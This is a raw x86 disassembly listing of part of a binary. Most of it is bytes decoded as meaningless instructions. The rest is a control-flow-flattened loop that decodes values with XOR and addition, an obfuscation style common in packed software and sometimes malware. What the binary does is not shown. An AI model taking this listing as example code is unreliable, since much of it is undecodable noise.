  40ea76:	mov    ch,BYTE PTR [ebp+0x4efde6d8]
  40ea7c:	push   esp
  40ea7d:	sbb    DWORD PTR [edi],esi
  40ea7f:	dec    esi
  40ea80:	mov    edx,0xcd5a0c41
  40ea85:	inc    esi
  40ea86:	ins    BYTE PTR es:[edi],dx
  40ea87:	fwait
  40ea88:	mov    ah,0x12
  40ea8a:	bound  esi,QWORD PTR [esi-0x8708349]
  40ea90:	cmp    al,BYTE PTR [ebp+0x29c5b25f]
  40ea96:	mov    dl,0xfa
  40ea98:	(bad)  
  40ea99:	leave  
  40ea9a:	rcr    DWORD PTR [eax-0x3be64db2],1
  40eaa0:	dec    ebp
  40eaa1:	in     eax,0x1e
  40eaa3:	inc    BYTE PTR [edx+0x31]
  40eaa6:	xor    eax,0x7caca8cf
  40eaab:	push   ecx
  40eaac:	dec    eax
  40eaad:	mov    edi,0x178b243d
  40eab2:	and    ch,BYTE PTR [esi+ebx*4]
  40eab5:	imul   BYTE PTR [eax-0x508b16c1]
  40eabb:	jmp    0x40eacc
  40eabd:	inc    ebp
  40eabe:	pusha  
  40eabf:	or     ch,BYTE PTR [edi+0x62]
  40eac2:	sub    ecx,0xffffffa0
  40eac5:	psllw  mm6,0x6b
  40eac9:	cmp    edx,DWORD PTR [edx]
  40eacb:	adc    BYTE PTR [edi+0x280bafe6],dl
  40ead1:	xlat   BYTE PTR ds:[ebx]
  40ead2:	test   al,0xa8
  40ead4:	sahf   
  40ead5:	call   0x6335:0x70f1a069
  40eadc:	xchg   ebp,eax
  40eadd:	les    ebx,FWORD PTR [eax-0x30]
  40eae0:	scas   al,BYTE PTR es:[edi]
  40eae1:	(bad)  
  40eae2:	dec    BYTE PTR [esi+edi*1-0x1f]
  40eae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eae7:	mov    eax,ds:0x146b24d8
  40eaec:	dec    esp
  40eaed:	mov    edi,0x1d0d1ed1
  40eaf2:	cmp    eax,0x4e6ab975
  40eaf7:	mov    edi,DWORD PTR [edi+0x5d730d5f]
  40eafd:	daa    
  40eafe:	adc    ebx,esi
  40eb00:	xor    BYTE PTR [ecx-0x4b],al
  40eb03:	dec    esp
  40eb04:	hlt    
  40eb05:	sub    ecx,0x81b73f49
  40eb0b:	test   DWORD PTR [eax+edx*8-0x13],esi
  40eb0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb10:	int    0xc6
  40eb12:	icebp  
  40eb13:	pop    eax
  40eb14:	lods   eax,DWORD PTR ds:[esi]
  40eb15:	in     al,dx
  40eb16:	jmp    0xa8fc41d1
  40eb1b:	mov    dh,dh
  40eb1d:	bound  eax,QWORD PTR [edi+0x6e]
  40eb20:	imul   esi,DWORD PTR [ebx],0xffffffb0
  40eb23:	push   ecx
  40eb24:	mov    al,BYTE PTR [ebx]
  40eb26:	icebp  
  40eb27:	je     0x40eaf8
  40eb29:	les    ebp,FWORD PTR [ecx+0x17]
  40eb2c:	dec    eax
  40eb2d:	mov    al,0xed
  40eb2f:	cld    
  40eb30:	int3   
  40eb31:	in     eax,0x5b
  40eb33:	movq   mm6,mm4
  40eb36:	push   ecx
  40eb37:	pusha  
  40eb38:	cld    
  40eb39:	and    DWORD PTR [ecx-0xf79d4e1],edx
  40eb3f:	aad    0xd1
  40eb41:	pusha  
  40eb42:	and    al,0x67
  40eb44:	fstp   DWORD PTR [edx+0x16d19430]
  40eb4a:	das    
  40eb4b:	arpl   WORD PTR [edx-0x6],bx
  40eb4e:	fld    DWORD PTR [esi+eiz*8+0x5a]
  40eb52:	mov    esi,0x5515d82b
  40eb57:	xchg   ebx,eax
  40eb58:	mov    ss,WORD PTR [eax-0x77ac79fd]
  40eb5e:	leave  
  40eb5f:	iret   
  40eb60:	inc    esp
  40eb61:	xchg   edi,eax
  40eb62:	imul   ebp,DWORD PTR [esi-0x65],0xffffffe6
  40eb66:	jno    0x40eb4e
  40eb68:	push   ds
  40eb69:	or     DWORD PTR [esi],0x52
  40eb6c:	stos   DWORD PTR es:[edi],eax
  40eb6d:	ds xor eax,0xe214422a
  40eb73:	pop    eax
  40eb74:	test   DWORD PTR [edx],ebp
  40eb76:	jae    0x40ebd0
  40eb78:	pop    edi
  40eb79:	mov    esi,0x2e32b2d4
  40eb7e:	outs   dx,BYTE PTR ds:[esi]
  40eb7f:	inc    esp
  40eb80:	int3   
  40eb81:	std    
  40eb82:	in     eax,dx
  40eb83:	or     BYTE PTR [edx-0x34de1cdf],bl
  40eb89:	inc    esi
  40eb8a:	fld    DWORD PTR [ebx]
  40eb8c:	lahf   
  40eb8d:	add    ebx,edx
  40eb8f:	sub    al,0x1f
  40eb91:	pop    ebx
  40eb92:	xchg   ebx,eax
  40eb93:	adc    al,0xb1
  40eb95:	pop    bx
  40eb98:	div    DWORD PTR [esi-0x6af3ff13]
  40eb9e:	mov    al,0x63
  40eba0:	pop    ss
  40eba1:	jno    0x40eb51
  40eba3:	loop   0x40eb8e
  40eba5:	sbb    al,0xae
  40eba7:	out    dx,al
  40eba8:	pop    esp
  40eba9:	iret   
  40ebaa:	lods   al,BYTE PTR ds:[esi]
  40ebab:	sbb    eax,0x92fba0bc
  40ebb0:	sbb    eax,0x8a64ed3d
  40ebb5:	imul   esp,DWORD PTR [ecx-0x60],0xffffffb5
  40ebb9:	and    esp,DWORD PTR [ebp+ebx*4-0x6dc75ba6]
  40ebc0:	jb     0x40eb84
  40ebc2:	cmc    
  40ebc3:	push   ss
  40ebc4:	test   bh,0xda
  40ebc7:	sub    al,0x3f
  40ebc9:	inc    ebp
  40ebca:	sub    cl,BYTE PTR [edx+0xe]
  40ebcd:	lds    edi,FWORD PTR [esi+edx*2]
  40ebd0:	xor    DWORD PTR [esi+ecx*8+0x31],0xd47e44ff
  40ebd8:	sub    al,0x3b
  40ebda:	ficomp DWORD PTR [esi-0x33]
  40ebdd:	les    ecx,FWORD PTR [ebp+0x55822fbc]
  40ebe3:	hlt    
  40ebe4:	jg     0x40ec4d
  40ebe6:	loope  0x40ec13
  40ebe8:	push   es
  40ebe9:	jmp    0x40eb9c
  40ebeb:	or     al,0xe6
  40ebed:	in     al,dx
  40ebee:	or     al,0x30
  40ebf0:	push   esi
  40ebf1:	ret    0x6402
  40ebf4:	push   ebx
  40ebf5:	mov    esi,0x8d59de89
  40ebfa:	fisub  DWORD PTR [ebx-0x39]
  40ebfd:	inc    edx
  40ebfe:	(bad)  
  40ebff:	mov    esi,0xc760937a
  40ec04:	lea    edx,[ebx-0x305a9f5e]
  40ec0a:	stc    
  40ec0b:	dec    ecx
  40ec0c:	jl     0x40ebb6
  40ec0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec0f:	lods   al,BYTE PTR ds:[esi]
  40ec10:	aad    0xe7
  40ec12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec13:	in     al,0x50
  40ec15:	push   ecx
  40ec16:	les    ebp,FWORD PTR [edx-0x48]
  40ec19:	jle    0x40ebdf
  40ec1b:	icebp  
  40ec1c:	mov    eax,ds:0xe9c09bfe
  40ec21:	test   eax,0xe6862b20
  40ec26:	xor    ebp,DWORD PTR [edx]
  40ec28:	icebp  
  40ec29:	lods   al,BYTE PTR ds:[esi]
  40ec2a:	popa   
  40ec2b:	imul   eax,eax,0x58
  40ec2e:	inc    eax
  40ec2f:	out    0xff,al
  40ec31:	jno    0x40ec6f
  40ec33:	xchg   ecx,eax
  40ec34:	lock pop ebx
  40ec36:	adc    dl,BYTE PTR [edi-0xc]
  40ec39:	adc    ebx,DWORD PTR [esp+ecx*2-0x48]
  40ec3d:	out    dx,eax
  40ec3e:	inc    ecx
  40ec3f:	call   0x11a8:0xd31b42a3
  40ec46:	call   0x8b:0x7098548a
  40ec4d:	mov    DWORD PTR ds:0x4337eb,0x3f94
  40ec57:	mov    DWORD PTR [ebp-0x14],eax
  40ec5a:	mov    DWORD PTR ds:0x4337b3,0x877
  40ec64:	mov    eax,ds:0x413c66
  40ec69:	mov    DWORD PTR ds:0x43372f,0x4b6e
  40ec73:	mov    eax,DWORD PTR [eax]
  40ec75:	mov    DWORD PTR ds:0x433833,0x73ce
  40ec7f:	mov    DWORD PTR [ebp-0x18],eax
  40ec82:	mov    DWORD PTR ds:0x43383f,0x7077
  40ec8c:	jmp    0x40f1ad
  40ec91:	cmp    edi,0x33d
  40ec97:	jne    0x40f120
  40ec9d:	and    DWORD PTR [ebp+0x8],0x0
  40eca1:	mov    eax,DWORD PTR [ebp-0x8]
  40eca4:	sub    eax,DWORD PTR [ebp+0x8]
  40eca7:	push   eax
  40eca8:	mov    eax,DWORD PTR [ebp-0x4]
  40ecab:	add    eax,DWORD PTR [ebp+0x8]
  40ecae:	push   eax
  40ecaf:	jmp    0x40eedc
  40ecb4:	es addr16 mov esi,0x2465bf5c
  40ecbb:	gs mov dh,0x91
  40ecbe:	test   BYTE PTR [eax+eiz*4-0x9050a5],bl
  40ecc5:	mov    eax,ds:0x7c0e7e7e
  40ecca:	jle    0x40ed4a
  40eccc:	xchg   edx,eax
  40eccd:	int3   
  40ecce:	jb     0x40ec91
  40ecd0:	fst    DWORD PTR [ebx+0x5f]
  40ecd3:	pusha  
  40ecd4:	adc    ecx,ebx
  40ecd6:	push   ss
  40ecd7:	rol    DWORD PTR [ebp+0x57],0xf5
  40ecdb:	sbb    al,0x39
  40ecdd:	outs   dx,BYTE PTR ds:[esi]
  40ecde:	fwait
  40ecdf:	ficomp WORD PTR cs:[eax+0x2b]
  40ece4:	mov    ds:0xe59e4692,al
  40ece9:	lods   al,BYTE PTR ds:[esi]
  40ecea:	push   ebx
  40eceb:	and    al,0xb6
  40eced:	popf   
  40ecee:	mov    dl,0x81
  40ecf0:	pop    esp
  40ecf1:	test   BYTE PTR [edx+ecx*1-0x684be],dl
  40ecf8:	cmp    BYTE PTR [edi],bh
  40ecfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecfb:	in     al,dx
  40ecfc:	inc    edx
  40ecfd:	test   al,0xe6
  40ecff:	pop    ss
  40ed00:	mov    ds:0xa95444f9,al
  40ed05:	mov    dl,0x10
  40ed07:	dec    ebp
  40ed08:	jl     0x40ecea
  40ed0a:	pushf  
  40ed0b:	sub    BYTE PTR [esi+0xe7085a9],cl
  40ed11:	loop   0x40ecdb
  40ed13:	loope  0x40ed68
  40ed15:	outs   dx,DWORD PTR ds:[esi]
  40ed16:	cmp    al,0xf6
  40ed18:	mov    ebx,0x5ddef0a6
  40ed1d:	int3   
  40ed1e:	sahf   
  40ed1f:	pop    ecx
  40ed20:	pop    esp
  40ed21:	into   
  40ed22:	retf   0x2a84
  40ed25:	push   esi
  40ed26:	cmp    eax,0x5b64b0c2
  40ed2b:	mov    eax,0x3d9d3f2
  40ed30:	or     al,0xd8
  40ed32:	sbb    edx,DWORD PTR [ebx]
  40ed34:	mov    ecx,0x811f87a1
  40ed39:	inc    esi
  40ed3a:	cmp    DWORD PTR ds:0x65cd6684,esi
  40ed40:	ret    0x99ea
  40ed43:	inc    esp
  40ed44:	fidiv  DWORD PTR [ecx+0x1b]
  40ed47:	mov    edi,0x23aaaea3
  40ed4c:	mov    al,ds:0xffe9d153
  40ed51:	pop    esi
  40ed52:	xor    bl,0x3e
  40ed55:	cld    
  40ed56:	mov    edi,0xe7c9a648
  40ed5b:	sti    
  40ed5c:	in     eax,0xe2
  40ed5e:	loop   0x40ece1
  40ed60:	mov    bl,0x6b
  40ed62:	fild   WORD PTR [edi+0x7dd4c618]
  40ed68:	cmp    BYTE PTR [edx],dh
  40ed6a:	jge    0x40edc6
  40ed6c:	sbb    al,0xe9
  40ed6e:	mov    cl,0x8c
  40ed70:	leave  
  40ed71:	jno    0x40ed44
  40ed73:	add    DWORD PTR [eax+0x72c80d94],ebp
  40ed79:	cmp    al,0x56
  40ed7b:	dec    edi
  40ed7c:	mov    edx,0x56ae928d
  40ed81:	push   ss
  40ed82:	nop
  40ed83:	fwait
  40ed84:	sti    
  40ed85:	jno    0x40ed9d
  40ed87:	mov    eax,0x202faae4
  40ed8c:	and    esi,ebp
  40ed8e:	ror    BYTE PTR [ebx+0x5d9061db],1
  40ed94:	popa   
  40ed95:	inc    esp
  40ed96:	aaa    
  40ed97:	jg     0x40ed33
  40ed99:	xchg   edi,eax
  40ed9a:	out    dx,al
  40ed9b:	call   DWORD PTR [edi-0x4a]
  40ed9e:	adc    al,0x8d
  40eda0:	cmp    bh,BYTE PTR [ebp-0x37]
  40eda3:	aam    0xe9
  40eda5:	sub    eax,ecx
  40eda7:	sbb    edi,ebp
  40eda9:	sub    ah,dl
  40edab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edac:	or     al,0xfb
  40edae:	cmp    BYTE PTR ds:0x74d44e2d,bl
  40edb4:	cmp    ch,BYTE PTR [ebx]
  40edb6:	jmp    0x53cfeb07
  40edbb:	and    al,0x80
  40edbd:	push   ebp
  40edbe:	jne    0x40ed74
  40edc0:	inc    esp
  40edc1:	cmp    al,BYTE PTR [eax-0x6eab0d72]
  40edc7:	call   FWORD PTR [ebp+0x25]
  40edca:	std    
  40edcb:	mov    ds:0xb45fa28f,eax
  40edd0:	ins    DWORD PTR es:[edi],dx
  40edd1:	adc    DWORD PTR [eax+ecx*4-0x6ccfcbaa],0x37
  40edd9:	fiadd  WORD PTR [edx-0x1c]
  40eddc:	cld    
  40eddd:	push   ds
  40edde:	and    edx,edx
  40ede0:	iret   
  40ede1:	jecxz  0x40ee4c
  40ede3:	bound  ecx,QWORD PTR [edx-0x37]
  40ede6:	leave  
  40ede7:	push   ds
  40ede8:	lods   eax,DWORD PTR ds:[esi]
  40ede9:	or     eax,0x3dcec39a
  40edee:	sub    esp,DWORD PTR ds:0x5596e250
  40edf4:	mov    ch,0x53
  40edf6:	repz js 0x40ed8a
  40edf9:	sub    eax,DWORD PTR [edx+0x3d]
  40edfc:	mov    bh,0x46
  40edfe:	imul   edi
  40ee00:	aaa    
  40ee01:	mov    esi,0xf2332f5f
  40ee06:	mov    al,ds:0x2d111738
  40ee0b:	fwait
  40ee0c:	xor    al,0x3f
  40ee0e:	or     ebx,0x6
  40ee11:	cmc    
  40ee12:	jl     0x40ee27
  40ee14:	mov    cl,dh
  40ee16:	cmp    al,0x7d
  40ee18:	add    DWORD PTR [ebx],0x78
  40ee1b:	es fwait
  40ee1d:	pop    esp
  40ee1e:	pop    ebp
  40ee1f:	rcr    DWORD PTR [edx],1
  40ee21:	hlt    
  40ee22:	add    eax,eax
  40ee24:	sbb    cl,dh
  40ee26:	inc    eax
  40ee27:	ds mov esi,0x280ad1f4
  40ee2d:	xchg   ebp,eax
  40ee2e:	pop    ebp
  40ee2f:	pop    es
  40ee30:	in     eax,0x7
  40ee32:	cs gs fcmovbe st,st(5)
  40ee36:	test   DWORD PTR [ebx-0x7213cadc],ebp
  40ee3c:	mov    al,ds:0x5f392244
  40ee41:	and    eax,0x48222480
  40ee46:	cmp    BYTE PTR [esi],0xa7
  40ee49:	add    edi,ebx
  40ee4b:	pop    eax
  40ee4c:	in     eax,dx
  40ee4d:	xchg   ecx,eax
  40ee4e:	gs inc esi
  40ee50:	jnp    0x40ee34
  40ee52:	or     ebp,esp
  40ee54:	xchg   ebp,eax
  40ee56:	das    
  40ee57:	jmp    0x92ba:0x8ed7a226
  40ee5e:	adc    al,0xa8
  40ee60:	push   esi
  40ee61:	add    BYTE PTR [esi],al
  40ee63:	mov    ebx,0x95c94127
  40ee68:	jmp    0x92f8:0xfff2281f
  40ee6f:	push   es
  40ee70:	aas    
  40ee71:	adc    eax,0x3e8cfbe1
  40ee76:	push   edi
  40ee77:	cli    
  40ee78:	push   eax
  40ee79:	cli    
  40ee7a:	jg     0x40ee92
  40ee7c:	push   ebp
  40ee7d:	push   0x70
  40ee7f:	jno    0x40ee31
  40ee81:	dec    ebx
  40ee82:	(bad)  
  40ee83:	mov    WORD PTR [ecx-0x6be2da7e],ss
  40ee89:	imul   ebx,DWORD PTR [edx-0x2b9f7627],0x3b9d465
  40ee93:	dec    esi
  40ee94:	and    al,0x5
  40ee96:	jmp    0xfa7c:0x5a10e86
  40ee9d:	add    al,0xfc
  40ee9f:	adc    esi,edi
  40eea1:	das    
  40eea2:	mov    esi,0x8fedfb04
  40eea7:	ret    0x4dd6
  40eeaa:	push   es
  40eeab:	and    al,0x64
  40eead:	aam    0x3
  40eeaf:	dec    esp
  40eeb0:	inc    edi
  40eeb1:	lahf   
  40eeb2:	int3   
  40eeb3:	cmp    eax,0xbe90ff49
  40eeb8:	sar    DWORD PTR [ebx],0xb6
  40eebb:	push   ss
  40eebc:	cmp    al,0x2
  40eebe:	dec    esi
  40eebf:	sahf   
  40eec0:	cmp    esp,DWORD PTR [eax-0x71d4ffce]
  40eec6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eec7:	mov    cl,0x87
  40eec9:	fdivr  st,st(4)
  40eecb:	xchg   DWORD PTR [ecx-0x21],ebx
  40eece:	xchg   edx,eax
  40eecf:	push   es
  40eed0:	push   edi
  40eed1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eed2:	ret    0x8a3b
  40eed5:	mov    cl,0x5c
  40eed7:	cwde   
  40eed8:	pop    edx
  40eed9:	repz in eax,dx
  40eedb:	sub    ebp,eax
  40eedd:	popf   
  40eede:	pop    ebx
  40eedf:	(bad)  
  40eee0:	(bad)  
  40eee1:	inc    DWORD PTR [ebp+0x8]
  40eee4:	cmp    DWORD PTR [ebp+0x8],0x52
  40eee8:	jb     0x40eca1
  40eeee:	jmp    0x40f1ad
  40eef3:	jmp    0x40f120
  40eef8:	lds    ebp,FWORD PTR [edx+0x1371069f]
  40eefe:	imul   ecx,DWORD PTR gs:[ebx+0x3198ef46],0x8f484d83
  40ef09:	scas   eax,DWORD PTR es:[edi]
  40ef0a:	jle    0x40ef8a
  40ef0c:	push   cs
  40ef0d:	jl     0x40ef8d
  40ef0f:	jle    0x40eeb6
  40ef11:	mov    ebp,0xeb09016d
  40ef16:	(bad)
  40ef19:	loope  0x40eebd
  40ef1b:	mov    ebp,0x694917d6
  40ef20:	pushf  
  40ef21:	idiv   BYTE PTR [ecx-0x1484735]
  40ef27:	jl     0x40ef15
  40ef29:	test   BYTE PTR [eax+edx*1+0x7f88482b],0xf2
  40ef31:	cmp    BYTE PTR [eax],0xb0
  40ef34:	mov    ebp,0x9a2e1eca
  40ef39:	add    DWORD PTR [ebx],ebx
  40ef3b:	adc    DWORD PTR [ebx+0x4a83fa9],esp
  40ef41:	pop    ebp
  40ef42:	ins    DWORD PTR es:[edi],dx
  40ef43:	sahf   
  40ef44:	push   ebp
  40ef45:	xchg   DWORD PTR [edx],edx
  40ef47:	ret    
  40ef48:	imul   esp,DWORD PTR [esi-0x59],0x37
  40ef4c:	sub    al,0x97
  40ef4e:	stos   BYTE PTR es:[edi],al
  40ef4f:	pusha  
  40ef50:	and    ebp,DWORD PTR [edx+0x39]
  40ef53:	fmul   DWORD PTR [ecx]
  40ef55:	mov    eax,ds:0xa9a0240b
  40ef5a:	cmp    dl,BYTE PTR [edi]
  40ef5c:	in     al,0x32
  40ef5e:	cmovs  ebx,DWORD PTR [esi+0x6f]
  40ef62:	jbe    0x40eee7
  40ef64:	fnstcw WORD PTR [ebx+0x44]
  40ef67:	in     al,dx
  40ef68:	clc    
  40ef69:	sahf   
  40ef6a:	xor    al,0xff
  40ef6c:	jne    0x40efc0
  40ef6e:	shr    BYTE PTR [eax+0x152a0a37],0x36
  40ef75:	sbb    al,BYTE PTR [ebp+0x12752570]
  40ef7b:	les    ebp,FWORD PTR [esi+0x155551bb]
  40ef81:	add    eax,0xfae909f8
  40ef86:	aas    
  40ef87:	pop    ds
  40ef88:	data16 jl 0x40efa0
  40ef8b:	out    dx,al
  40ef8c:	sbb    eax,0xf5b721e4
  40ef91:	jle    0x40efbf
  40ef93:	mov    ds:0xada401f8,eax
  40ef98:	dec    esi
  40ef99:	cli    
  40ef9a:	test   ecx,ebx
  40ef9c:	push   esi
  40ef9d:	out    dx,al
  40ef9e:	imul   esp,DWORD PTR [ecx],0xf
  40efa1:	(bad)  
  40efa2:	mov    ss,WORD PTR [edx]
  40efa4:	nop
  40efa5:	aas    
  40efa6:	jl     0x40ef8e
  40efa8:	enter  0x9730,0x65
  40efac:	xor    DWORD PTR [esp+eax*2+0x4d0d4db8],edi
  40efb3:	lea    edx,[esi+ebx*4-0x61]
  40efb7:	(bad)  
  40efb8:	pop    ebp
  40efb9:	data16 (bad) 
  40efbb:	jns    0x40ef72
  40efbd:	jge    0x40ef5a
  40efbf:	scas   eax,DWORD PTR es:[edi]
  40efc0:	lahf   
  40efc1:	or     BYTE PTR [edx+edx*2],ah
  40efc4:	cmp    DWORD PTR [eax-0x293f0fa7],ebx
  40efca:	cwde   
  40efcb:	bound  ebp,QWORD PTR [ecx-0x7a]
  40efce:	(bad)  
  40efcf:	cli    
  40efd0:	sbb    dl,dl
  40efd2:	mov    bh,0x71
  40efd4:	mov    cl,0xc4
  40efd6:	sbb    ebp,ecx
  40efd8:	in     eax,dx
  40efd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efda:	cld    
  40efdb:	lahf   
  40efdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efdd:	add    DWORD PTR [ebx-0x7],0x5773670d
  40efe4:	mov    ebp,0xc0eb4507
  40efe9:	mov    cl,0x8c
  40efeb:	loop   0x40f022
  40efed:	mov    eax,0x96791348
  40eff2:	out    0x50,al
  40eff4:	push   edx
  40eff5:	popf   
  40eff6:	out    dx,eax
  40eff7:	retf   
  40eff8:	sbb    eax,0xbf223e6e
  40effd:	stc    
  40effe:	and    al,0xa0
  40f000:	mov    ah,0xb3
  40f002:	leave  
  40f003:	push   ss
  40f004:	pushfw 
  40f006:	cmp    ah,BYTE PTR [eax-0x45]
  40f009:	in     al,0x7c
  40f00b:	das    
  40f00c:	out    dx,al
  40f00d:	or     BYTE PTR [ebp+0x64e0ab24],0x4f
  40f014:	dec    esi
  40f015:	xor    eax,0x173e2b09
  40f01a:	jp     0x40f016
  40f01c:	mov    bh,0xbc
  40f01e:	dec    ebx
  40f01f:	xor    DWORD PTR ds:0x677940ac,eax
  40f025:	stc    
  40f026:	sub    esp,DWORD PTR fs:[ebx]
  40f029:	out    0xb,al
  40f02b:	mov    ecx,0x775d743e
  40f030:	scas   eax,DWORD PTR es:[edi]
  40f031:	neg    BYTE PTR [esi-0x56303ed6]
  40f037:	mov    al,0x6b
  40f039:	scas   al,BYTE PTR es:[edi]
  40f03a:	ins    BYTE PTR es:[edi],dx
  40f03b:	cwde   
  40f03c:	repnz cmp edi,ebp
  40f03f:	inc    DWORD PTR [edi]
  40f041:	out    dx,al
  40f042:	or     eax,0xb8456093
  40f047:	(bad)  ds:0xf21371b2
  40f04d:	inc    edi
  40f04e:	inc    ebp
  40f04f:	ja     0x40f09a
  40f051:	push   0x41
  40f053:	mov    cl,0x98
  40f055:	mov    esp,0xfbed1fb5
  40f05a:	fdivr  DWORD PTR [ebx+0x55]
  40f05d:	shr    bh,0xa8
  40f060:	stos   BYTE PTR es:[edi],al
  40f061:	imul   edx,DWORD PTR [eax+eiz*8],0x141acfc9
  40f068:	sub    cl,ah
  40f06a:	lods   al,BYTE PTR ds:[esi]
  40f06b:	pop    esp
  40f06c:	pusha  
  40f06d:	push   ebp
  40f06e:	add    al,0xd2
  40f071:	adc    DWORD PTR [edx-0x52],ecx
  40f074:	stos   BYTE PTR es:[edi],al
  40f075:	ins    DWORD PTR es:[edi],dx
  40f076:	add    eax,0x25f4ba3
  40f07b:	jg     0x40f037
  40f07d:	xor    DWORD PTR ds:0x7d6ca981,0x845cce29
  40f087:	push   esi
  40f088:	rcr    BYTE PTR [edx-0x633097da],0xa0
  40f08f:	push   0xc7de2981
  40f094:	mov    edi,0x63fc1c8f
  40f099:	enter  0x6685,0xb
  40f09d:	vcvtsi2ss xmm5,xmm5,DWORD PTR [eax+0x18da375f]
  40f0a5:	cmp    al,0xdf
  40f0a7:	xlat   BYTE PTR ds:[ebx]
  40f0a8:	les    ebx,FWORD PTR [esi-0x143b4526]
  40f0ae:	and    eax,0x72aa23db
  40f0b3:	jb     0x40f039
  40f0b5:	cmp    BYTE PTR [edx+ebp*2+0x7b],bl
  40f0b9:	dec    esi
  40f0ba:	leave  
  40f0bb:	icebp  
  40f0bc:	xor    DWORD PTR [esi],0x3fa5640
  40f0c2:	mov    ebp,0x2bd1b5f9
  40f0c7:	push   0x5c319a36
  40f0cc:	mov    esi,0xd204b24a
  40f0d1:	mov    bh,0x5
  40f0d3:	leave  
  40f0d4:	sub    ebp,DWORD PTR [eax*2+0x49b2db5f]
  40f0db:	sar    ecx,0x17
  40f0de:	sbb    cl,bh
  40f0e0:	push   ebp
  40f0e1:	fisub  DWORD PTR [esi]
  40f0e3:	push   eax
  40f0e4:	ficomp DWORD PTR [edx+0x5b00d55e]
  40f0ea:	gs inc edi
  40f0ec:	mov    dl,0x82
  40f0ee:	rol    DWORD PTR [ecx-0x17],0xc
  40f0f2:	adc    DWORD PTR [esi],esp
  40f0f4:	aas    
  40f0f5:	in     eax,0x38
  40f0f7:	js     0x40f098
  40f0f9:	sbb    al,0x4b
  40f0fb:	sbb    DWORD PTR [edi-0x3b],0xc84bbbc8
  40f102:	ror    DWORD PTR [ecx+0x41d1f795],1
  40f108:	mov    dl,0xd9
  40f10a:	pusha  
  40f10b:	jg     0x40f185
  40f10d:	pusha  
  40f10e:	in     al,dx
  40f10f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f110:	jo     0x40f138
  40f112:	fs mul esp
  40f115:	mov    dh,0xbb
  40f117:	jno    0x40f102
  40f119:	jo     0x40f0b0
  40f11b:	in     al,0xf0
  40f11d:	loop   0x40f16d
  40f11f:	leave  
  40f120:	cmp    edi,0x1a3
  40f126:	jne    0x40f17b
  40f12c:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40f133:	mov    eax,DWORD PTR [ebp-0x4]
  40f136:	mov    DWORD PTR [ebp-0x5c],eax
  40f139:	mov    eax,DWORD PTR [ebp-0x8]
  40f13c:	mov    DWORD PTR [ebp-0x58],eax
  40f13f:	mov    eax,DWORD PTR [ebp-0xc]
  40f142:	xor    eax,esi
  40f144:	add    eax,ebx
  40f146:	mov    DWORD PTR [ebp-0x54],eax
  40f149:	lea    eax,[ebp-0x1c]
  40f14c:	mov    DWORD PTR [ebp-0x50],eax
  40f14f:	mov    eax,DWORD PTR [ebp-0x60]
  40f152:	xor    eax,esi
  40f154:	add    eax,ebx
  40f156:	mov    DWORD PTR [ebp-0x60],eax
  40f159:	lea    eax,[ebp-0x60]
  40f15c:	push   eax
  40f15d:	mov    eax,DWORD PTR [ebp+0xc]
  40f160:	xor    eax,esi
  40f162:	add    eax,ebx
  40f164:	push   eax
  40f165:	mov    eax,ds:0x413bfe
  40f16a:	push   0x413b54
  40f16f:	push   DWORD PTR [eax]
  40f171:	call   0x40c099
  40f176:	jmp    0x40f1ad
  40f17b:	cmp    edi,0x13d
  40f181:	jne    0x40f1ad
  40f187:	mov    eax,DWORD PTR [ebp-0x10]
  40f18a:	xor    eax,esi
  40f18c:	add    eax,ebx
  40f18e:	mov    DWORD PTR [ebp+0x8],eax
  40f191:	mov    eax,ds:0x413bde
  40f196:	mov    DWORD PTR [ebp+0x8],eax
  40f199:	mov    eax,DWORD PTR [ebp-0x14]
  40f19c:	mov    DWORD PTR [ebp-0x4],eax
  40f19f:	mov    eax,DWORD PTR [ebp-0x4]
  40f1a2:	push   0x4
  40f1a4:	pop    ecx
  40f1a5:	sub    ecx,eax
  40f1a7:	add    ecx,DWORD PTR [ebp-0x18]
  40f1aa:	mov    DWORD PTR [ebp-0x8],ecx
  40f1ad:	mov    eax,DWORD PTR [ebp+0xc]
  40f1b0:	xor    eax,esi
  40f1b2:	lea    edi,[edi+eax*1+0x32729b]
  40f1b9:	cmp    edi,0x50b
  40f1bf:	jne    0x40ea09
  40f1c5:	mov    eax,DWORD PTR [ebp+0xc]
  40f1c8:	pop    edi
  40f1c9:	xor    eax,esi
  40f1cb:	jmp    0x40f3f8
  40f1d0:	push   edx
  40f1d1:	mov    ecx,0x7215e615
  40f1d6:	jno    0x40f241
  40f1d8:	scas   al,BYTE PTR es:[edi]
  40f1d9:	out    dx,al
  40f1da:	lds    esp,FWORD PTR [edx-0x3e6172ff]
  40f1e0:	lahf   
  40f1e1:	lods   eax,DWORD PTR ds:[esi]
  40f1e2:	jle    0x40f262
  40f1e4:	push   cs
  40f1e5:	jl     0x40f265
  40f1e7:	jle    0x40f193
  40f1e9:	loopne 0x40f193
  40f1eb:	fist   DWORD PTR [edi-0x46]
  40f1ee:	call   0xc292:0xeb9c70b1
  40f1f5:	pop    edx
  40f1f6:	push   eax
  40f1f7:	or     al,0x2b
  40f1f9:	adc    ecx,DWORD PTR [edi]
  40f1fb:	pushf  
  40f1fc:	lahf   
  40f1fd:	pusha  
  40f1fe:	outs   dx,BYTE PTR ds:[esi]
  40f1ff:	inc    ebp
  40f200:	int3   
  40f201:	fs jmp 0xbfbb:0x2a4935d1
  40f209:	push   esp
  40f20a:	pop    eax
  40f20b:	fmul   DWORD PTR [ebx-0x37]
  40f20e:	nop
  40f20f:	xlat   BYTE PTR ds:[ebx]
  40f210:	xor    DWORD PTR cs:[ebp+eax*1+0x3371a8],edx
  40f218:	sar    ch,cl
  40f21a:	mov    eax,ds:0x50a4db81
  40f21f:	rol    DWORD PTR [esp+ecx*2],1
  40f222:	and    eax,0x48f50966
  40f227:	jmp    0x69f8f439
  40f22c:	pop    ebp
